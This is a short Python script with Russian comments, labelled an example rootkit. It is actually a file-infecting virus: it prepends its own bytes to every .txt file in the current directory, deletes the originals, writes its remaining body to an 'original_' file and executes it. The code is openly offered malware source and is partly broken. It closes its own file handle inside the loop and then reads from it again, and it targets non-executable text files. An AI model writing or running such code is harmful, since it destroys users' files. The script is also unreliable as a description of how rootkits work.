import os
import sys

"""
Пример руткита на Python
"""
print(32*'#', "\nPython rootkit")
virPath = os.path.split(sys.argv[0])  # Получаем имя скрипта в будующем ехе-шника
names = os.listdir('.')  # имена всех файлов в директории
fVir = open(sys.argv[0], 'rb')  # открываем буфер в файл вируса, в байтах
virData = fVir.read(19456)  # считываем код rootkit'а
for name in names:  # для каждого файла в директории ...
    namePair = os.path.splitext(name)  # расчленяем на имя и расширение и...
    if namePair[1] == '.txt' and name != virPath[1]:  # ... если,  но не наш вирь
        os.rename(name, name + 'tmp')  # переименовываем в имя +'tmp'
        fProg = open(name + 'tmp', 'rb')  # открываем на бинорное чтение...
        progData = fProg.read()  # ... и выгружем содержимое
        with open(name, 'wb') as fNew:  # создаем новый файл ...
            fNew.write(virData + progData)  # заполняем код виря + код программы
        fProg.close()  # закрываем сокет файла...
        os.remove(name + 'tmp')  # ... и удаляем оригинал файла
        # Создаем сам файл-исполнитель
        originProgData = fVir.read()  # дочитываем тело виря
        originProg = 'original_' + virPath[1]  # создаем новое имя файла из 'original_' и имени червя
        with open(originProg, 'wb') as fOrigin:  # создаем файл с этим именем и ...
            fOrigin.write(originProgData)  # заливаем код виря в него
        fVir.close()
        os.execl(originProg, ' ')
print('After virus body')
